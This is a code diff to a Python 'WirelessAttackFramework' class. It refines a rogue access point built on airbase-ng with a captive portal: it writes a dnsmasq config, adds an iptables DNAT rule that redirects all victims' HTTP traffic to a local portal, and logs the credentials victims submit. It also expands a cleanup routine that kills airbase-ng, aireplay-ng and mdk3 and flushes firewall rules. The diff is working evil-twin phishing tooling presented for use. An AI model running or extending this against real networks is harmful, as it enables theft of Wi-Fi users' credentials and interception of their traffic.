@@ -1287,7 +1287,7 @@ class WirelessAttackFramework:
 
         print(f"Modified {modified_count} forms across {len(html_files)} files")
 
-    def launch_rogue_ap_with_portal(self, portal_dir):
+    def launch_rogue_ap_with_portal(self, portal_dir, portal_subdir='cloned'):
         """Launch rogue AP with captive portal infrastructure"""
         import http.server
         import socketserver
@@ -1309,6 +1309,21 @@ class WirelessAttackFramework:
             for service in ['apache2', 'nginx', 'lighttpd', 'httpd']:
                 subprocess.run(['sudo', 'systemctl', 'stop', service],
                             capture_output=True)
+
+            time.sleep(2)
+
+        # Check if port 53 (DNS) is in use
+        dns_check = subprocess.run(['sudo', 'lsof', '-i', ':53'],
+                                capture_output=True, text=True)
+        if dns_check.stdout:
+            print("\nPort 53 (DNS) is already in use:")
+            print(dns_check.stdout)
+            print("\nStopping conflicting DNS services...")
+
+            # Stop systemd-resolved or other DNS services
+            subprocess.run(['sudo', 'systemctl', 'stop', 'systemd-resolved'],
+                        capture_output=True)
+            subprocess.run(['sudo', 'pkill', 'dnsmasq'], capture_output=True)
 
             time.sleep(2)
 
@@ -1410,11 +1425,14 @@ class WirelessAttackFramework:
             dnsmasq_conf = portal_dir / 'dnsmasq.conf'
             with open(dnsmasq_conf, 'w') as f:
                 f.write(f'''interface=at0
-    dhcp-range=192.168.1.100,192.168.1.200,12h
-    dhcp-option=3,192.168.1.1
-    dhcp-option=6,192.168.1.1
-    address=/#/192.168.1.1
-    ''')
+            bind-interfaces
+            dhcp-range=192.168.1.100,192.168.1.200,12h
+            dhcp-option=3,192.168.1.1
+            dhcp-option=6,192.168.1.1
+            no-resolv
+            no-poll
+            port=0
+            ''')
 
             # 2. Start airbase-ng (rogue AP)
             print("Starting rogue AP...")
@@ -1428,6 +1446,7 @@ class WirelessAttackFramework:
             airbase_proc = subprocess.Popen(airbase_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             processes.append(('airbase-ng', airbase_proc))
             time.sleep(3)
+            print("\n" * 2)
 
             # 3. Configure at0 interface
             print("Configuring network...")
@@ -1439,17 +1458,31 @@ class WirelessAttackFramework:
             dnsmasq_cmd = [
                 'sudo', self.tool_paths['dnsmasq'],
                 '-C', str(dnsmasq_conf),
-                '--no-daemon'
+                '--no-daemon',
+                '--log-dhcp',  # Add DHCP logging
+                '--log-queries'  # Add DNS logging
             ]
-            dnsmasq_proc = subprocess.Popen(dnsmasq_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            dnsmasq_proc = subprocess.Popen(dnsmasq_cmd)  # Remove DEVNULL to see output
             processes.append(('dnsmasq', dnsmasq_proc))
+            time.sleep(2)
+
+            # Verify at0 is configured
+            print("Verifying at0 interface...")
+            result = subprocess.run(['ip', 'addr', 'show', 'at0'], capture_output=True, text=True)
+            print(result.stdout)
 
             # 5. Set up iptables for NAT and port forwarding
             print("Configuring firewall rules...")
-            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'],
+            # Redirect all HTTP traffic to our web server
+            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', 'at0',
+                        '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', '192.168.1.1:80'],
                         capture_output=True)
+
+            # Allow forwarding from at0
             subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-i', 'at0', '-j', 'ACCEPT'],
                         capture_output=True)
+
+            # Enable IP forwarding
             subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'],
                         capture_output=True)
 
@@ -1468,7 +1501,9 @@ class WirelessAttackFramework:
             print(f"Portal: http://192.168.1.1")
             print(f"Credentials logged to: {creds_file}")
             print(f"\nWaiting for clients to connect...")
-            print("Press Ctrl+C to stop\n")
+            print("Press Ctrl+C to stop")
+            print(f"{'='*70}\n")
+            sys.stdout.flush()
 
             httpd.serve_forever()
 
@@ -1504,7 +1539,8 @@ class WirelessAttackFramework:
 
             # Clean up iptables rules
             print("Removing firewall rules...")
-            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-D', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'],
+            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', 'at0',
+                        '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', '192.168.1.1:80'],
                         capture_output=True)
             subprocess.run(['sudo', 'iptables', '-D', 'FORWARD', '-i', 'at0', '-j', 'ACCEPT'],
                         capture_output=True)
@@ -1786,39 +1822,102 @@ class WirelessAttackFramework:
         print("="*60)
 
         try:
+            # Kill any lingering attack processes first
+            print("Stopping attack processes...")
+            attack_processes = [
+                'airbase-ng', 'airodump-ng', 'aireplay-ng',
+                'mdk3', 'hostapd', 'dnsmasq'
+            ]
+
+            for proc in attack_processes:
+                subprocess.run(['sudo', 'pkill', '-9', proc],
+                            capture_output=True, stderr=subprocess.DEVNULL)
+
+            time.sleep(1)
+
+            # Clean up virtual interfaces
+            print("Removing virtual interfaces...")
+            virtual_ifaces = ['at0', 'mon0']
+            for viface in virtual_ifaces:
+                subprocess.run(['sudo', 'ip', 'link', 'delete', viface],
+                            capture_output=True, stderr=subprocess.DEVNULL)
+
+            # Clean up iptables rules
+            print("Cleaning firewall rules...")
+            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'],
+                        capture_output=True)
+            subprocess.run(['sudo', 'iptables', '-F', 'FORWARD'],
+                        capture_output=True)
+            subprocess.run(['sudo', 'iptables', '-X'],
+                        capture_output=True)
+
             if not self.selected_interface:
-                print("No interface was selected - restarting NetworkManager only.")
-                subprocess.run(['sudo', 'systemctl', 'start', 'NetworkManager'],
-                            capture_output=True)
-                subprocess.run(['sudo', 'service', 'network-manager', 'start'],
-                            capture_output=True)
-                return
+                print("No interface was selected.")
+            else:
+                print(f"Resetting {self.selected_interface}...")
 
-            print(f"Resetting {self.selected_interface}...")
+                # Check if interface exists
+                result = subprocess.run(['ip', 'link', 'show', self.selected_interface],
+                                    capture_output=True)
+                if result.returncode != 0:
+                    print(f"Interface {self.selected_interface} not found, skipping reset")
+                else:
+                    # Turn off promiscuous mode
+                    subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'promisc', 'off'],
+                                capture_output=True, stderr=subprocess.DEVNULL)
 
-            # Turn off promiscuous mode
-            subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'promisc', 'off'],
-                        capture_output=True)
+                    # Bring interface down
+                    subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'down'],
+                                capture_output=True)
 
-            # Reset interface
-            subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'down'],
-                        capture_output=True)
-            subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'mode', 'managed'],
-                        capture_output=True)
-            subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'up'],
+                    time.sleep(1)
+
+                    # Reset to managed mode
+                    subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'mode', 'managed'],
+                                capture_output=True, stderr=subprocess.DEVNULL)
+
+                    # Remove any manual IP addresses
+                    subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', self.selected_interface],
+                                capture_output=True)
+
+                    # Bring interface back up
+                    subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'up'],
+                                capture_output=True)
+
+                    time.sleep(2)
+
+            # Restart system DNS services
+            print("Restarting system services...")
+
+            # Restart systemd-resolved (if it was stopped)
+            subprocess.run(['sudo', 'systemctl', 'start', 'systemd-resolved'],
+                        capture_output=True, stderr=subprocess.DEVNULL)
+
+            # Restart NetworkManager (use restart instead of start)
+            subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'],
                         capture_output=True)
 
             time.sleep(2)
 
-            # Restart NetworkManager
-            print("Restarting NetworkManager...")
-            subprocess.run(['sudo', 'systemctl', 'start', 'NetworkManager'],
-                        capture_output=True)
-            subprocess.run(['sudo', 'service', 'network-manager', 'start'],
-                        capture_output=True)
+            # Verify interface is back in managed mode
+            if self.selected_interface:
+                result = subprocess.run(['iwconfig', self.selected_interface],
+                                    capture_output=True, text=True)
+                if 'Mode:Managed' in result.stderr or 'Mode:Managed' in result.stdout:
+                    print(f"✓ {self.selected_interface} restored to managed mode")
+                else:
+                    print(f"⚠ {self.selected_interface} may not be in managed mode")
 
-            time.sleep(2)
-            print("Interface restoration complete")
+                # Check NetworkManager control
+                nm_check = subprocess.run(['nmcli', 'device', 'status'],
+                                        capture_output=True, text=True)
+                if self.selected_interface in nm_check.stdout:
+                    for line in nm_check.stdout.split('\n'):
+                        if self.selected_interface in line:
+                            print(f"  NetworkManager status: {line.strip()}")
+                            break
+
+            print("\nInterface restoration complete")
 
         except Exception as e:
             print(f"Cleanup error: {e}")
